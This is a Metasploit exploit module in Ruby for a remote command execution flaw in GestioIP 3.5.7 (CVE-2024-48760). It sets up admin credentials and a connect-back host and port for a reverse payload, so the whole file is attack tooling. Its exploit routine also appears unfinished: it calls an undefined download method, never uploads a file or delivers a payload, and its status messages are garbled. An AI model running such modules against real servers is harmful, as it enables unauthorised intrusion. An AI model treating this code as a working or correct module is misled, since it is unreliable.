##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GestioIP 3.5.7 Remote Command Execution',
        'Description' => %q{
          This module exploits a command execution via file upload.
          If GestioIP is configured to use no authentication for admin account,
          no password is required to exploit the vulnerability. Otherwise, an authenticated
          user with admin right on the web site is required to exploit.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'maxibelino', # Original finder of CVE-2024-48760
          'odeez24' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2024-48760' ],
          [ 'URL', 'https://github.com/maxibelino/CVEs/tree/main/CVE-2024-48760']
        ],
        'Platform' => [ 'unix' ],
        'Arch' => ARCH_CMD,
        'Targets' => [[ 'GestioIP 3.5.7', {}]],
        'Privileged' => true,
        'DisclosureDate' => '2025-01-14',
        'DefaultTarget' => 0,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [false, 'URI of the target', '/gestioip/api/upload.cgi']),
        OptString.new('HttpUsername', [true, 'The username to auth as', 'gipadmin']),
        OptString.new('HttpPassword', [true, 'The password to auth with', '']),
        OptString.new('LHOST', [true, 'IP adresse you want the payload to connect back', '']),
        OptString.new('LPORT', [true, 'Port you want the payload to connect back', ''])
      ]
    )
  end

  def post_auth?
    true
  end

  def user
    datastore['HttpUsername']
  end

  def pass
    datastore['HttpPassword']
  end

  def use_auth
    !(pass.nil? or pass.empty?)
  end

  def exploit
    print_status('Download the backupdor the file overwritten')
    options = {
      'uri' => normalize_uri(target_uri.path, 'ip_checkhost.cgi'),
      'encode_params' => false
    }

    if use_auth
      options.merge!('authorization' => basic_auth(user, pass))
    end

    res = download(options)

    if res && (res.code == 401)
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - Please provide USERNAME and PASSOWRD")
    end
  end
end
